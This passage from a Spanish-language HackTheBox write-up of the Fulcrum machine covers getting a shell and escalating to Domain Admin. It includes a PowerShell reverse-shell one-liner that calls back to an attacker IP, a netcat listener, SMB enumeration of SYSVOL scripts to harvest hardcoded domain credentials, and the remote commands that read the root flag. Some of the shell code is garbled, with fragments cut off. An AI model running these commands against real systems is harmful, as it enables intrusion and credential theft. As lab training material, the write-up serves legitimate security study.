<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">*</span>Evil-WinRM<span class="k">*</span> PS C:<span class="se">\W</span>indows<span class="se">\T</span>emp<span class="se">\P</span>rivesc&gt; Invoke-Command <span class="nt">-ComputerName</span> file.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-Command</span> <span class="o">{</span> <span class="nv">$client</span> <span class="o">=</span> New-Object System.Net.Sockets.TCPClient<span class="o">(</span><span class="s1">'10.10.14.62'</span>,53<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span> <span class="o">=</span> <span class="nv">$client</span>.GetStream<span class="o">()</span><span class="p">;</span><span class="o">[</span>byte[]]<span class="err">$</span>
s.Length<span class="o">))</span>
ng<span class="o">)</span>.GetString<span class="o">(</span><span class="nv">$bytes</span>,0, <span class="nv">$i</span><span class="o">)</span><span class="p">;</span><span class="nv">$sendback</span> <span class="o">=</span> <span class="o">(</span>iex <span class="nv">$data</span> 2&gt;&amp;1 | Out-String <span class="o">)</span><span class="p">;</span><span class="nv">$sendback2</span>  <span class="o">=</span> <span class="nv">$sendback</span> + <span class="s1">'PS '</span> + <span class="o">(</span><span class="nb">pwd</span><span class="o">)</span>.Path + <span class="s1">'&gt; '</span><span class="p">;</span><span class="nv">$sendbyte</span> <span class="o">=</span> <span class="o">([</span>text.encoding]::A
.Length<span class="o">)</span><span class="p">;</span><span class="nv">$stream</span>.Flush<span class="o">()}</span><span class="p">;</span><span class="nv">$client</span>.Close<span class="o">()</span> <span class="o">}</span>
</code></pre></div></div>

<ul>
  <li>Recibimos la shell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>‚ûú  ~ rlwrap nc <span class="nt">-nlvp</span> 53
listening on <span class="o">[</span>any] 53 ...
connect to <span class="o">[</span>10.10.14.62] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.62] 49738

PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nb">whoami
</span>fulcrum<span class="se">\b</span>tables
PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt;
</code></pre></div></div>

<h2 id="user-flag">User flag</h2>

<ul>
  <li>Ya podemos leer la flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>esktop<span class="se">\u</span>ser.txt
fce52521c8f872b514f037fada78daf4
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>

<ul>
  <li>Vamos a enumerar por smb desde la powershell.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; net use <span class="se">\\</span>dc.fulcrum.local /user:fulcrum.local<span class="se">\B</span>Tables ++FileServerLogon12345++
The <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; net view <span class="se">\\</span>dc.fulcrum.local /all
Shared resources at <span class="se">\\</span>dc.fulcrum.local



Share name  Type  Used as  Comment

<span class="nt">-------------------------------------------------------------------------------</span>
ADMIN<span class="nv">$ </span>     Disk           Remote Admin
C<span class="nv">$ </span>         Disk           Default share
IPC<span class="nv">$ </span>       IPC   <span class="o">(</span>UNC<span class="o">)</span>    Remote IPC
NETLOGON    Disk           Logon server share
SYSVOL      Disk           Logon server share
The <span class="nb">command </span>completed successfully.
</code></pre></div></div>

<ul>
  <li>Vamos a enumerar <code class="language-plaintext highlighter-rouge">SYSVOL</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nb">dir</span> <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL


    Directory: <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL


Mode                LastWriteTime         Length Name                                                                                                                                                                   
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                                                                                                                   
d----l         5/7/2022  11:52 PM                fulcrum.local  
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nb">dir</span> <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local


    Directory: <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local


Mode                LastWriteTime         Length Name                                                                                                                                                                   
<span class="nt">----</span>                <span class="nt">-------------</span>         <span class="nt">------</span> <span class="nt">----</span>                                                                                                                                                                   
d-----         5/7/2022  11:52 PM                Policies                                                                                                                                                               
d-----         5/7/2022  11:52 PM                scripts    
</code></pre></div></div>

<ul>
  <li>Este script reporta demasiados .ps1</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nb">dir</span> <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local<span class="se">\S</span>cripts
</code></pre></div></div>

<ul>
  <li>
    <p>Los scripts contienen credenciales de usuarios del dominio si recordamos hay un usuario el cual es parte de <code class="language-plaintext highlighter-rouge">Domain Admins</code> que es <code class="language-plaintext highlighter-rouge">923a</code>.</p>
  </li>
  <li>
    <p>Si filtramos por ese usuario como string en todos los archivos encontramos sus credenciales.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; Select-String <span class="s1">'923a'</span> <span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local<span class="se">\S</span>cripts<span class="se">\*</span>

<span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local<span class="se">\S</span>cripts<span class="se">\3</span>807dacb-db2a-4627-b2a3-123d048590e7.ps1:3:<span class="nv">$Pass</span> <span class="o">=</span> <span class="s1">'@fulcrum_df0923a7ca40_$'</span> | ConvertTo-SecureString <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
<span class="se">\\</span>dc.fulcrum.local<span class="se">\S</span>YSVOL<span class="se">\f</span>ulcrum.local<span class="se">\S</span>cripts<span class="se">\a</span>1a41e90-147b-44c9-97d7-c9abb5ec0e2a.ps1:2:<span class="nv">$User</span> <span class="o">=</span> <span class="s1">'923a'</span>
</code></pre></div></div>

<ul>
  <li>
    <p>Podemos ejecutar comandos como ese usuario directamente o usar <code class="language-plaintext highlighter-rouge">evil-winrm</code> pero para eso necesitamos usar chisel.</p>
  </li>
  <li>
    <p>Como el usuario es parte de Domain Admin puedes leer la root flag directamente.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nv">$password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">'@fulcrum_bf392748ef4e_$'</span> <span class="nt">-AsPlainText</span> <span class="nt">-Force</span>
PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; <span class="nv">$Cred</span> <span class="o">=</span> New-Object System.Management.Automation.PSCredential<span class="o">(</span><span class="s1">'FULCRUM\923a'</span>, <span class="nv">$password</span><span class="o">)</span>
PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; Invoke-Command <span class="nt">-ComputerName</span> dc.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span> <span class="nb">whoami</span> <span class="o">}</span>
fulcrum<span class="se">\9</span>23a
</code></pre></div></div>

<ul>
  <li>Vemos la root flag.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:<span class="se">\U</span>sers<span class="se">\B</span>Tables<span class="se">\D</span>ocuments&gt; Invoke-Command <span class="nt">-ComputerName</span> dc.fulcrum.local <span class="nt">-Credential</span> <span class="nv">$Cred</span> <span class="nt">-ScriptBlock</span> <span class="o">{</span> <span class="nb">type </span>C:<span class="se">\U</span>sers<span class="se">\A</span>dministrator<span class="se">\D</span>esktop<span class="se">\r</span>oot.txt <span class="o">}</span>
8ddbe372e57c019bb6c4cdb5b35a0cab
</code></pre></div></div>]]></content><author><name>MiguelRega7</name></author><category term="hackthebox/machines/insane" /><summary type="html"><![CDATA[]]></summary></entry></feed>